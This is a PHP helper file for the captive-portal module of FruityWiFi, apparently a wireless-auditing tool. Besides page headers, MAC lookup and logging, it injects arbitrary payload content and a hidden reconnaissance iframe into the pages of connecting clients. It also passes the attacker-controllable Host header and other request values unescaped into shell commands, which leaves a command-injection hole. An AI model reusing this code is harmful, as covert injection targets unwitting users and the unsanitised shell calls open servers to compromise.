<?php
/*
	Copyright (C) 2013-2016 xtr4nge [_AT_] gmail.com

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/ 
?>
<?php

// GLOBAL VARIABLES
$aup = file_get_contents('/var/www/captive/aup.txt');

// Function to print page header
function print_header($portal_name) {
    //Set no caching
    header("Expires: Mon, 1 Jan 1900 00:00:00 GMT");
    header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
    header("Cache-Control: no-store, no-cache, must-revalidate");
    header("Cache-Control: post-check=0, pre-check=0", false);
    header("Pragma: no-cache");
?>
    <html>
        <head><title>Welcome to <?php echo $portal_name;?></title>
        <meta HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
        <meta name="viewport" content="target-densitydpi=device-dpi">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
        <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> -->
        <meta name="apple-mobile-web-app-capable" content="yes"/>
        <link rel="stylesheet" type="text/css" href="includes/style.css">
        <!-- <link rel="shortcut icon" href="wifi.ico" type="image/x-icon" /> -->
    </head>

    <body>
<?php
}

// Function to print page footer
function print_footer() {
    echo "</body>";
    echo "</html>";
}

function getMAC($ip) {
    global $bin_arp;
    
    // execute the arp command to get their mac address
    $exec = "$bin_arp -an $ip";
    $mac = exec_fruitywifi($exec);
    
    preg_match('/..:..:..:..:..:../',$mac[0] , $matches);
    $mac = @$matches[0];
    
    return $mac;
}

function injectPayload() {
    $filename = "/usr/share/fruitywifi/www/modules/captive/includes/inject.txt";
    $inject = open_file($filename);
    echo $inject;
}

function injectRecon() {
    echo "<iframe style='visibility:hidden;display:none' height='0' width='0' src='_recon.php'></iframe>";
}

function setRedirect() {
    global $io_in_ip;
    $debug = false;
    $redirect_file = "/usr/share/fruitywifi/www/modules/captive/includes/redirect.txt";
    $domain = trim($_SERVER["HTTP_HOST"]);
    $ip = trim($_SERVER['REMOTE_ADDR']);
    
    if ($domain != $io_in_ip) {
        exec("grep '$ip=' $redirect_file", $out);
        
        if ($debug) {
            print_r($out);
            print "<br>";
        }
        
        if ($out[0] != "") {
            $exec = "sed -i 's/$ip=.*/$ip=$domain/g' $redirect_file";
            exec_fruitywifi($exec);
        } else {
            $exec = "echo '$ip=$domain' >> $redirect_file";
            exec_fruitywifi($exec);
        }
        
        if ($debug) {
            unset($out);
            exec("grep '$ip=' $redirect_file", $out);
            print_r($out);
        }
    }
}

function getRedirect() {
    global $io_in_ip;
    $redirect_file = "/usr/share/fruitywifi/www/modules/captive/includes/redirect.txt";
    $ip = trim($_SERVER['REMOTE_ADDR']);
    
    exec("grep '$ip=' $redirect_file", $out);
    if ($out[0] != "") {
        $temp = explode("=",$out[0]);
        $redirect = $temp[1];
    } else {
        $redirect = "www.google.com";
    }
    return $redirect;
}

function storeEvent($mac, $ip, $current_script, $r_url) {
    global $mod_logs;
    
	$debug_file = $mod_logs;
	$datetime = date("Y-m-d H:i:s");
	$exec = " echo '$datetime|$mac|$ip|$current_script|$r_url' >> $mod_logs";
	exec_fruitywifi($exec);
}

?>